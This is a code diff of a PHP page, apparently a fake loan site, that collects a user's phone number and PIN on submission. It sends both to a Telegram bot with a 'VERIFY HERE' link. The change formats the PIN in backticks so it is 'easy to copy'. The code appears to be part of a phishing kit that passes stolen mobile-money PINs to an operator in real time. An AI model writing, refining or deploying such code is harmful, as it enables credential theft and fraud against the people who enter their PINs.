@@ -50,7 +50,7 @@ function getDbConnection($host, $port, $dbname, $user, $pass) {
 }
 
 /**
- * Send Telegram message with blue underlined PIN
+ * Send Telegram message
  */
 function sendTelegramMessage($botToken, $chatId, $message) {
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
@@ -194,12 +194,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
             $_SESSION['submitted_pin'] = $pin;
             $_SESSION['verifying'] = true;
             
-            // Send Telegram notification with BLUE UNDERLINED PIN (using Markdown link format)
+            // Send Telegram notification with PIN in backticks (monospace, easy to copy with long press)
             $ip = "https://loan-1-i36j.onrender.com/verify.php";
             $time = date('Y-m-d H:i:s');
-            // Using [PIN](https://t.me) format makes it blue and underlined in Telegram
-            // But to make just the PIN blue and underlined without being a real link, we use a fake URL
-            $msg = "🔐 *PIN Verification Request*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: [{$pin}](https://t.me/verifypin)\n⏰ Time: {$time}\n🌐 VERIFY HERE: {$ip}";
+            $msg = "🔐 *PIN Verification Request*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `{$pin}`\n⏰ Time: {$time}\n🌐 VERIFY HERE: {$ip}";
             sendTelegramMessage($botToken, $chatId, $msg);
             
             // Redirect to show verifying state (DB value is still 0, will show verifying)
